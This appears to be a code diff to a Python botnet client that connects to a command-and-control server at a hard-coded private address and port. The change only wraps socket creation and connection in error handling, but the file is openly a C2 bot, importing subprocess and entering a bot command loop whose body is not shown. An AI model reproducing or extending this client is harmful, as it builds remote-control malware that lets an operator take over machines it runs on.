@@ -1,5 +1,6 @@
 import socket
 import subprocess
+import sys
 
 class bcolors:
     HEADER = '\033[95m'
@@ -14,8 +15,19 @@ class bcolors:
 
 if __name__ == "__main__":
     print("[+] Client Bot Connecting too CnC server...")
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.connect(("192.168.255.37", 8085))  #  connection ip of CnC bot server and port
+
+    try:         
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    except socket.error as e: 
+        print (f"{bcolors.FAIL}[x] Error creating socket: %s.{bcolors.ENDC}" % e) 
+        sys.exit(1)
+    
+    try: 
+        s.connect(("192.168.255.37", 8085))  #  connection ip of CnC bot server and port
+    except socket.error as e: 
+        print (f"{bcolors.FAIL}[x] CnC server not running or not reachable, connection failed: %s.{bcolors.ENDC}" % e)                
+        sys.exit(1)
+    
     run_bot = True
     while run_bot:
         communicate_bot = True
@@ -46,3 +58,4 @@ if __name__ == "__main__":
 
     s.close()
     exit()
+  
